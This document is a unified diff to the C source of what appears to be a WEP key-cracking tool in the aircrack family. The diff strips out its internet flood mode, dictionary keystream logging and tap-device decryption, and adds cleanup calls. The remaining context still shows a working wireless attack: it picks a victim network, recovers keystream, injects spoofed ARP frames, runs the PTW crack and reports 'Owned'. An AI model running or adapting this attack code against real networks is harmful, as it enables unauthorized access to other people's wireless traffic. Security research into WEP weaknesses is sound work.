@@ -16,9 +16,6 @@
 #include <net/if.h>
 #include <netinet/in.h>
 #include <netinet/in_systm.h>
-#define __FAVOR_BSD
-#include <netinet/udp.h>
-#undef __FAVOR_BSD
 #include <arpa/inet.h>
 #include <sys/time.h>
 #include <time.h>
@@ -41,7 +38,6 @@
 #include "ethernet.h"
 #include "if_arp.h"
 #include "if_llc.h"
-#include "ip.h"
 
 #define FIND_VICTIM		0
 #define FOUND_VICTIM		1
@@ -109,10 +105,6 @@ struct wep_log {
 #define LINKTYPE_IEEE802_11     105
 #define TCPDUMP_MAGIC           0xA1B2C3D4
 
-char* floodip = 0;
-unsigned short floodport = 6969;
-unsigned short floodsport = 53;
-
 char* netip = 0;
 int netip_arg = 0;
 int max_chan = 11;
@@ -122,9 +114,6 @@ unsigned char* rtrmac = 0;
 unsigned char mymac[] = "\x00\x00\xde\xfa\xce\x0d";
 int have_mac = 1;
 char myip[16] = "192.168.0.123";
-
-int bits = 0;
-int ttl_val = 0;
 
 PTW_attackstate *ptw;
 
@@ -147,19 +136,8 @@ unsigned char ip_clear[] =  "\xAA\xAA\x03\x00\x00\x00\x08\x00";
 
 int min_prga =  128;
 
-/*
- * When starting aircrack we try first to use a
- * local copy, falling back to where the installed
- * version is expected.
- * XXX builtin pathnames
- */
-#define CRACK_LOCAL_CMD "../aircrack/aircrack"
-#define CRACK_INSTALL_CMD "/usr/local/bin/aircrack"
-
 #define INCR 10000
 int thresh_incr = INCR;
-
-#define MAGIC_TTL_PAD 69
 
 int crack_dur = 60;
 int wep_thresh = INCR;
@@ -171,65 +149,10 @@ struct timeval real_start;
 #define PADDED_ARPLEN 54
 
 #define PRGA_LEN (1500-14-20-8)
-unsigned char inet_clear[8+20+8+PRGA_LEN+4];
 
-#define DICT_PATH "dict"
-#define TAP_DEV "/dev/tap3"
-unsigned char tapdev[16];
-unsigned char taptx[4096];
-unsigned int taptx_len = 0;
-struct tif *ti;
+struct wif *_wi;
 
-/********** RIPPED
-************/ 
-unsigned short in_cksum (unsigned short *ptr, int nbytes) {
-  register long sum;
-  u_short oddbyte;
-  register u_short answer;
-
-  sum = 0;
-  while (nbytes > 1)
-    {
-      sum += *ptr++;
-      nbytes -= 2;
-    }
-
-  if (nbytes == 1)
-    {
-      oddbyte = 0;
-      *((u_char *) & oddbyte) = *(u_char *) ptr;
-      sum += oddbyte;
-    }
-
-  sum = (sum >> 16) + (sum & 0xffff);
-  sum += (sum >> 16);
-  answer = ~sum;
-  return (answer);
-}
-/**************
-************/
-
-unsigned int udp_checksum(unsigned char *stuff, int len, struct in_addr *sip,
-                          struct in_addr *dip) {
-        unsigned char *tmp;
-        struct ippseudo *ph;
-
-        tmp = (unsigned char*) malloc(len + sizeof(struct ippseudo));
-        if(!tmp)
-		err(1, "malloc()");
-
-        ph = (struct ippseudo*) tmp;
-
-        memcpy(&ph->ippseudo_src, sip, 4);
-        memcpy(&ph->ippseudo_dst, dip, 4);
-        ph->ippseudo_pad =  0;
-        ph->ippseudo_p = IPPROTO_UDP;
-        ph->ippseudo_len = htons(len);
-
-        memcpy(tmp + sizeof(struct ippseudo), stuff, len);
-
-        return in_cksum((unsigned short*)tmp, len+sizeof(struct ippseudo));
-}
+void cleanup(int x);
 
 void time_print(char* fmt, ...) {
         va_list ap;
@@ -290,6 +213,8 @@ void check_key() {
 
 	printf ("Owned in %.02f minutes\n", 
 		((double) now.tv_sec - real_start.tv_sec)/60.0);
+
+	cleanup(0);
 	exit(0);
 }
 
@@ -324,6 +249,9 @@ void cleanup(int x) {
 		close(weplog.fd);
 
 	kill_crack();
+
+	if (_wi)
+		wi_close(_wi);
 
 	exit(0);	
 }
@@ -640,54 +568,6 @@ void do_llc(unsigned char* buf, unsigned short type) {
 	h->llc_un.type_snap.ether_type = htons(type);
 }
 
-void calculate_inet_clear() {
-	struct ip* ih;
-	struct udphdr* uh;
-	uLong crc;
-	unsigned long *pcrc;
-	int dlen;
-
-	memset(inet_clear, 0, sizeof(inet_clear));
-
-	do_llc(inet_clear, ETHERTYPE_IP);
-
-	ih = (struct ip*) &inet_clear[8];
-	ih->ip_hl = 5;
-	ih->ip_v = 4;
-	ih->ip_tos = 0;
-	ih->ip_len = htons(20+8+PRGA_LEN);
-	ih->ip_id = htons(666);
-	ih->ip_off = 0;
-	ih->ip_ttl = ttl_val;
-	ih->ip_p = IPPROTO_UDP;
-	ih->ip_sum = 0;
-	inet_aton(floodip, &ih->ip_src);
-	inet_aton(myip, &ih->ip_dst);
-	ih->ip_sum = in_cksum((unsigned short*)ih, 20);
-
-	uh = (struct udphdr*) ((char*)ih + 20);
-	uh->uh_sport = htons(floodport);
-	uh->uh_dport = htons(floodsport);
-	uh->uh_ulen = htons(8+PRGA_LEN);
-	uh->uh_sum = 0;
-        uh->uh_sum = udp_checksum((unsigned char*)uh, 8+PRGA_LEN,
-                                  &ih->ip_src, &ih->ip_dst);
-
-	// crc
-	dlen = 8 + 20 + 8 + PRGA_LEN;
-	assert (dlen + 4 <= (int) sizeof(inet_clear));
-
-	crc = crc32(0L, Z_NULL, 0);
-	crc = crc32(crc, inet_clear, dlen);
-	pcrc = (unsigned long*) (inet_clear+dlen);
-	*pcrc = crc;
-
-#if 0
-	printf("INET %d\n", sizeof(inet_clear));
-	hexdump(inet_clear, sizeof(inet_clear));
-#endif	
-}
-
 void set_prga(unsigned char* iv, unsigned char* cipher, 
 	      unsigned char* clear, int len) {
 
@@ -746,114 +626,6 @@ void set_prga(unsigned char* iv, unsigned char* cipher,
 		exit(1);
 	}
 
-	close(fd);
-}
-
-
-void log_dictionary(unsigned char* body, int len) {
-	char paths[3][3];
-	int i, rd;
-	int fd;
-	char path[128];
-	unsigned char file_clear[sizeof(inet_clear)];
-	unsigned char* data;
-
-	len -= 4; // IV etc..
-	assert (len == sizeof(inet_clear));
-
-	data = body +4;
-	
-	if (len > prgainfo.len)
-		set_prga(body, data, inet_clear, len);
-
-	
-	for (i = 0; i < 3; i++) 
-		snprintf(paths[i], sizeof(paths[i]), "%.2X", body[i]);
-
-
-	strcpy(path, DICT_PATH);
-
-
-	// first 2 bytes
-	for (i = 0; i < 2; i++) {
-		strcat(path, "/");
-		strcat(path, paths[i]);
-		fd = open(path, O_RDONLY);
-		if (fd == -1) {
-			if (errno != ENOENT) {
-				perror("open()");
-				exit(1);
-			}
-
-			if (mkdir(path, 0755) == -1) {
-				perror("mkdir()");
-				exit(1);
-			}
-		}
-		else
-			close(fd);
-	}
-
-	// last byte
-	strcat(path, "/");
-	strcat(path, paths[2]);
-
-	fd = open(path, O_RDWR);
-	// already exists... see if we are consistent...
-	if (fd != -1) {
-		rd = read(fd, file_clear, sizeof(file_clear));
-
-		if (rd == -1) {
-			perror("read()");
-			exit(1);
-		}
-
-		// check consistency....
-		for (i = 0; i < rd; i++) {
-			if (file_clear[i] != 
-			    (data[i] ^ inet_clear[i])) {
-			
-				printf("Mismatch in byte %d for:\n", i);
-				hexdump(body, len+4);
-				exit(1);
-			}    
-		}
-
-		// no need to log
-		if (i >= (int) sizeof(inet_clear)) {
-#if 0		
-			time_print("Not logging IV %.2X:%.2X:%.2X cuz we got it\n",
-				body[0], body[1], body[2]);
-#endif				
-			close(fd);
-			return;
-		}
-	
-		// file has less... fd still open
-		
-	} else {
-		fd = open(path, O_WRONLY | O_CREAT, 0644);
-		if (fd == -1) {
-			printf("Can't open (%s): %s\n", path,
-			       strerror(errno));
-			exit(1);
-		}
-	}
-
-	assert (sizeof(file_clear) >= sizeof(inet_clear));
-
-	for(i = 0; i < len; i++)
-		file_clear[i] = data[i] ^ inet_clear[i];
-
-	rd = write(fd, file_clear, len);
-	if (rd == -1) {
-		perror("write()");
-		exit(1);
-	}
-	if (rd != len) {
-		printf("Wrote %d of %d\n", rd, len);
-		exit(1);
-	}
 	close(fd);
 }
 
@@ -980,34 +752,6 @@ void stuff_for_us(struct ieee80211_frame* wh, int len) {
 
 			return;
 		}
-#if 0
-		// check if its a TTL update from dictionary stuff
-		if (dlen >= (8+20+8+MAGIC_TTL_PAD) && 
-		    dlen <= (8+20+8+MAGIC_TTL_PAD+128)) {
-			int ttl_delta, new_ttl;
-			
-			ttl_delta = dlen - 8 - 20 - 8 - MAGIC_TTL_PAD;
-			new_ttl = 128 - ttl_delta;
-
-			if (ttl_val && new_ttl != ttl_val) {
-				time_print("oops. ttl changed from %d to %d\n",
-					   ttl_val, new_ttl);
-				exit(1);	   
-			}
-
-			if (!ttl_val) {
-				ttl_val = new_ttl;
-				printf("\n");
-				time_print("Got TTL of %d\n", ttl_val);
-				calculate_inet_clear();
-			}
-		}
-
-		// check if its dictionary data
-		if (ttl_val && dlen == (8+20+8+PRGA_LEN)) {
-			log_dictionary(body, len - sizeof(*wh));
-		}
-#endif		
 	}
 
 #if 0
@@ -1103,103 +847,6 @@ void log_wep(struct ieee80211_frame* wh, int len) {
 
 	memcpy(weplog.iv, body, 3);
 	weplog.packets++;
-}
-
-void try_dictionary(struct ieee80211_frame* wh, int len) {
-	unsigned char *body;
-	char path[52];
-	char paths[3][3];
-	int i;
-	int fd, rd;
-	unsigned char packet[4096];
-	int dlen;
-	struct ether_header* eh;
-	uLong crc;
-	unsigned long *pcrc;
-	unsigned char* dmac, *smac;
-
-	assert(len < (int) (sizeof(packet) + sizeof(*eh)));
-
-	body = (unsigned char*) wh + sizeof(*wh);
-
-	for (i = 0; i < 3; i++)
-		snprintf(paths[i], sizeof(paths[i]), "%.2X", body[i]);
-
-	sprintf(path, "%s/%s/%s/%s", DICT_PATH, paths[0], paths[1], paths[2]);
-
-	fd = open(path, O_RDONLY);
-	if (fd == -1)
-		return;
-
-	rd = read(fd, &packet[6], sizeof(packet)-6);
-	if (rd == -1) {
-		perror("read()");
-		exit(1);
-	}
-	close(fd);
-
-
-	dlen = len - sizeof(*wh) - 4;
-	if (dlen > rd) {
-		printf("\n");
-		time_print("Had PRGA (%s) but too little (%d/%d)\n", path, rd,
-		dlen);
-		return;
-	}
-
-	body += 4;
-	for (i = 0; i < dlen; i++)
-		packet[6+i] ^= body[i];
-
-	dlen -= 4;
-	crc = crc32(0L, Z_NULL, 0);
-	crc = crc32(crc, &packet[6], dlen);
-	pcrc = (unsigned long*) (&packet[6+dlen]);
-
-	if (*pcrc != crc) {
-		printf("\n");
-		time_print("HAD PRGA (%s) checksum mismatch! (%x %x)\n",
-			   path, *pcrc, crc);
-		return;
-	}
-
-	// fill ethernet header
-	eh = (struct ether_header*) packet;
-	if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
-		smac = wh->i_addr3;
-	else
-		smac = wh->i_addr2;
-
-	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
-		dmac = wh->i_addr3;
-	else
-		dmac = wh->i_addr1;
-
-	memcpy(eh->ether_dhost, dmac, 6);
-	memcpy(eh->ether_shost, smac, 6);
-	// ether type should be there from llc
-
-	dlen -= 8; // llc
-	dlen += sizeof(*eh);
-
-#if 0
-	printf("\n");
-	time_print("Decrypted packet [%d bytes]!!! w00t\n", dlen);
-	hexdump(packet, dlen);
-#endif
-
-	if (!ti)
-		return;
-
-	rd = ti_write(ti, packet, dlen);
-	if (rd == -1) {
-		perror("write()");
-		exit(1);
-	}
-	if (rd != dlen) {
-		printf("Wrote %d / %d\n", rd, dlen);
-		exit(1);
-	}
 }
 
 int is_arp(struct ieee80211_frame *wh, int len)
@@ -1325,9 +972,6 @@ void got_wep(struct ieee80211_frame* wh, int rd) {
 		}
 		log_wep(wh, rd);
 		add_keystream(wh, rd);
-	
-		// try to decrypt too
-		try_dictionary(wh, rd);
 	}	
 	
 	// look for arp-request packets... so we can decrypt em
@@ -1685,12 +1329,6 @@ void decrypt(struct wif *wi) {
 		unsigned short* seq;
 		decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1]++;
 
-#if 0		
-		if (decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1] == 0) {
-			printf("Can't decrpyt!\n");
-			exit(1);
-		}
-#endif
 		decryptstate.fragstate.wh.i_addr3[5] =
 		decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1];
 
@@ -1703,130 +1341,6 @@ void decrypt(struct wif *wi) {
 
 	send_fragment(wi, &decryptstate.fragstate,
 		      &decryptstate.prgainfo);
-}
-
-void flood_inet(struct wif *wi) {
-	static int send_arp = -1;
-	static unsigned char arp_pkt[128];
-	static int arp_len;
-	static unsigned char udp_pkt[128];
-	static int udp_len;
-	static struct timeval last_ip;
-
-	// need to init packets...
-	if (send_arp == -1) {
-		unsigned char* body;
-		unsigned char* ptr;
-		struct ieee80211_frame* wh;
-		struct ip* ih;
-		struct udphdr* uh;
-
-		memset(arp_pkt, 0, sizeof(arp_pkt));
-		memset(udp_pkt, 0, sizeof(udp_pkt));
-
-		// construct ARP
-		wh = (struct ieee80211_frame*) arp_pkt;
-		fill_basic(wh);
-
-		wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
-		wh->i_fc[1] |= IEEE80211_FC1_WEP | IEEE80211_FC1_DIR_TODS;
-		memset(wh->i_addr3, 0xff, 6);
-
-		body = (unsigned char*) wh + sizeof(*wh);
-		ptr = body;
-		ptr += 4; // iv
-
-		do_llc(ptr, ETHERTYPE_ARP);
-		ptr += 8;
-		do_arp(ptr, ARPOP_REQUEST, mymac, myip,
-		       (unsigned char*) "\x00\x00\x00\x00\x00\x00", netip);
-
-		wepify(body, 8+8+20);
-		arp_len = sizeof(*wh) + 4 + 8 + 8 + 20 + 4;
-		assert(arp_len < (int)sizeof(arp_pkt));
-
-
-		// construct UDP
-		wh = (struct ieee80211_frame*) udp_pkt;
-		fill_basic(wh);
-		
-		wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
-		wh->i_fc[1] |= IEEE80211_FC1_WEP | IEEE80211_FC1_DIR_TODS;
-		memcpy(wh->i_addr3, rtrmac, 6);
-
-		body = (unsigned char*) wh + sizeof(*wh);
-		ptr = body;
-		ptr += 4; // iv
-
-		do_llc(ptr, ETHERTYPE_IP);
-		ptr += 8;
-
-		ih = (struct ip*) ptr;
-		ih->ip_hl = 5;
-		ih->ip_v = 4;
-		ih->ip_tos = 0;
-		ih->ip_len = htons(20+8+5);
-		ih->ip_id = htons(666);
-		ih->ip_off = 0;
-		ih->ip_ttl = 128;
-		ih->ip_p = IPPROTO_UDP;
-		ih->ip_sum = 0;
-
-		inet_aton(myip, &ih->ip_src);
-		inet_aton(floodip, &ih->ip_dst);
-
-		ih->ip_sum = in_cksum((unsigned short*)ih, 20);
-
-		ptr += 20;
-		uh = (struct udphdr*) ptr;
-		uh->uh_sport = htons(floodsport);
-		uh->uh_dport = htons(floodport);
-		uh->uh_ulen = htons(8+5);
-		uh->uh_sum = 0;
-
-		ptr += 8;
-		strcpy((char*)ptr, "sorbo");
-
-		uh->uh_sum = udp_checksum(ptr - 8, 8+5, &ih->ip_src,
-					  &ih->ip_dst);
-
-		wepify(body, 8+20+8+5);
-		udp_len = sizeof(*wh) + 4 + 8 + 20 + 8 + 5 + 4;
-		assert(udp_len < (int)sizeof(udp_pkt));
-
-		// bootstrap
-		send_arp = 1;
-
-		memset(&last_ip, 0, sizeof(last_ip));
-	}
-
-	if (send_arp == 1) {
-		struct timeval now;
-		unsigned long sec;
-
-		if (gettimeofday(&now, NULL) == -1) {
-			perror("gettimeofday()");
-			exit(1);
-		}
-
-		sec = now.tv_sec - last_ip.tv_sec;
-
-		if (sec < 5)
-			return;
-
-		send_frame(wi, arp_pkt, arp_len);
-		send_arp = 0;
-	}
-
-	else if (send_arp == 0) {
-		if (gettimeofday(&last_ip, NULL) == -1) {
-			perror("gettimeofday()");
-			exit(1);
-		}
-		
-		send_frame(wi, udp_pkt, udp_len);
-		send_arp = 1;
-	} else assert(0);
 }
 
 void send_arp(struct wif *wi, unsigned short op, char* srcip, 
@@ -1892,12 +1406,6 @@ void can_write(struct wif *wi) {
 			if (!prgainfo.prga)
 				break;
 
-			if (taptx_len) {
-				send_frame(wi, taptx, taptx_len);
-				taptx_len = 0;
-				break;
-			}	
-
 			// try to find rtr mac addr
 			if (netip && !rtrmac) {
 				char* ptr;
@@ -1928,18 +1436,10 @@ void can_write(struct wif *wi) {
 	
 			// need to generate traffic...
 			if (rtrmac > (unsigned char*)1 && netip) {
-				if (floodip)
-					flood_inet(wi);
-				else {
-					// XXX lame technique... anyway... im
-					// only interested in flood_inet...
-
-					// could ping broadcast....
-					send_arp(wi, ARPOP_REQUEST, myip, mymac,
-						 arp_ip, (unsigned char*)
-						 "\x00\x00\x00\x00\x00\x00");
-				}
-
+				// could ping broadcast....
+				send_arp(wi, ARPOP_REQUEST, myip, mymac,
+					 arp_ip, (unsigned char*)
+					 "\x00\x00\x00\x00\x00\x00");
 				break;
 			}
 
@@ -2029,71 +1529,6 @@ void try_crack() {
 	wep_thresh += thresh_incr;
 }
 
-void open_tap() {
-	ti = ti_open(NULL);
-}
-
-void read_tap() {
-	unsigned char buf[4096];
-	struct ether_header* eh;
-	struct ieee80211_frame* wh;
-	int rd;
-	unsigned char* ptr, *body;
-	int dlen;
-
-	rd = ti_read(ti, buf, sizeof(buf));
-	if (rd == -1) {
-		perror("read()");
-		exit(1);
-	}
-	dlen = rd - sizeof(*eh);
-
-	assert(dlen > 0);
-
-	if (dlen+8 > prgainfo.len) {
-		printf("\n");
-		// XXX lame message...
-		time_print("Sorry... want to send %d but only got %d prga\n",
-			   dlen, prgainfo.len);
-		return;	   
-
-	}
-
-	if (taptx_len) {
-		printf("\n");
-		time_print("Sorry... overflow in TAP queue [of 1 packet =P] overwriting\n");
-		// XXX could not read instead and get rid of it in select...
-	}
-
-	assert (rd < (int)(sizeof(buf)-sizeof(*wh) - 8 - 8));
-
-	eh = (struct ether_header*) buf;
-
-	wh = (struct ieee80211_frame*) taptx;
-	memset(wh, 0, sizeof(*wh));
-	fill_basic(wh);
-
-        wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
-        wh->i_fc[1] |= IEEE80211_FC1_WEP | IEEE80211_FC1_DIR_TODS;
-
-	memcpy(wh->i_addr2, eh->ether_shost, 6);
-	memcpy(wh->i_addr3, eh->ether_dhost, 6);
-
-        body = (unsigned char*) wh + sizeof(*wh);
-        ptr = body;
-        ptr += 4; // iv
-
-	do_llc(ptr, ntohs(eh->ether_type));
-	ptr += 8;
-
-	memcpy(ptr, &buf[sizeof(*eh)], dlen);
-
-	wepify(body, 8+dlen); 
-	taptx_len = sizeof(*wh) + 4 + 8 + dlen + 4;
-
-	assert (taptx_len < sizeof(taptx));
-}
-
 int elapsedd(struct timeval *past, struct timeval *now)
 {
         int el;
@@ -2177,23 +1612,7 @@ void own(struct wif *wi) {
 		close(fd);
 	}
 
-	fd = open(DICT_PATH, O_RDONLY);
-	if (fd == -1) {
-		time_print("Creating dictionary directory (%s)\n", DICT_PATH);
-		if (mkdir (DICT_PATH, 0755) == -1) {
-			perror("mkdir()");
-			exit(1);
-		}
-	}
-	else
-		close(fd);
-
-	open_tap();
-
-	if (ti != NULL && ti_fd(ti) > wifd)
-		largest = ti_fd(ti);
-	else
-		largest = wifd;
+	largest = wifd;
 
 	if (signal(SIGINT, &cleanup) == SIG_ERR) {
 		perror("signal()");
@@ -2305,8 +1724,6 @@ void own(struct wif *wi) {
 		// select
 		FD_ZERO(&rfd);
 		FD_SET(wifd, &rfd);
-		if (ti != NULL)
-			FD_SET(ti_fd(ti), &rfd);
 		tv.tv_sec = 0;
 		tv.tv_usec = 1000*10;
 		rd = select(largest+1, &rfd, NULL, NULL, &tv);
@@ -2332,11 +1749,6 @@ void own(struct wif *wi) {
 					pbarp = &pbar[0];
 				// input
 				anal(buf, rd, wi);
-			}
-
-			// tap
-			if (ti != NULL && FD_ISSET(ti_fd(ti), &rfd)) {
-				read_tap();
 			}
 		}
 
@@ -2397,7 +1809,7 @@ void own(struct wif *wi) {
 void start(char *dev) {
 	struct wif *wi;
 
-	wi = wi_open(dev);
+	_wi = wi = wi_open(dev);
 	if (!wi)
 		err(1, "wi_open(%s)", dev);
 
@@ -2408,7 +1820,7 @@ void start(char *dev) {
 		if (wi_set_mac(wi, mymac) == -1)
 			printf("Can't set mac\n");
 	}
-	printf("Using mac %s\n", mac2str(mymac));
+	time_print("Using mac %s\n", mac2str(mymac));
 
 	ptw = PTW_newattackstate();
 	if (!ptw)
@@ -2423,17 +1835,15 @@ void usage(char* pname) {
 	printf("Usage: %s <opts>\n", pname);
 	printf("-h\t\tthis lame message\n");
 	printf("-i\t\t<iface>\n");
-	printf("-s\t\t<flood server ip>\n");
 	printf("-m\t\t<my ip>\n");
 	printf("-n\t\t<net ip>\n");
-	printf("-r\t\t<rtr mac>\n");
 	printf("-a\t\t<mymac>\n");
 	printf("-c\t\tdo not crack\n");
 	printf("-p\t\t<min prga>\n");
-	printf("-4\t\t64 bit key\n");
 	printf("-v\t\tvictim mac\n");
 	printf("-t\t\t<crack thresh>\n");
 	printf("-f\t\t<max chan>\n");
+
 	exit(0);
 }
 
@@ -2455,7 +1865,6 @@ void str2mac(unsigned char* dst, char* mac) {
 
 int main(int argc, char *argv[]) {
 	char* dev = "ath0";
-	unsigned char rtr[6];
 	unsigned char vic[6];
 
 	int ch;
@@ -2476,15 +1885,11 @@ int main(int argc, char *argv[]) {
 
 	state = FIND_VICTIM;
 
-	while ((ch = getopt(argc, argv, "hi:s:m:r:a:n:cp:4v:t:f:")) != -1) {
+	while ((ch = getopt(argc, argv, "hi:m:a:n:cp:v:t:f:")) != -1) {
 		switch (ch) {
 			case 'a':
 				str2mac(mymac, optarg);
 				have_mac = 1;
-				break;
-
-			case 's':
-				floodip = optarg;
 				break;
 
 			case 'i':
@@ -2499,11 +1904,6 @@ int main(int argc, char *argv[]) {
 			case 'n':
 				netip = optarg;
 				netip_arg = 1;
-				break;
-
-			case 'r':
-				str2mac(rtr, optarg);
-				rtrmac = rtr;
 				break;
 
 			case 'v':
@@ -2527,10 +1927,6 @@ int main(int argc, char *argv[]) {
 				max_chan = atoi(optarg);
 				break;
 
-			case '4':
-				bits = 64;
-				break;
-			
 			default:
 				usage(argv[0]);
 				break;
@@ -2543,5 +1939,7 @@ int main(int argc, char *argv[]) {
 		close(chaninfo.s);
 	if(victim.ssid)
 		free(victim.ssid);
+
+	cleanup(0);
 	exit(0);
 }
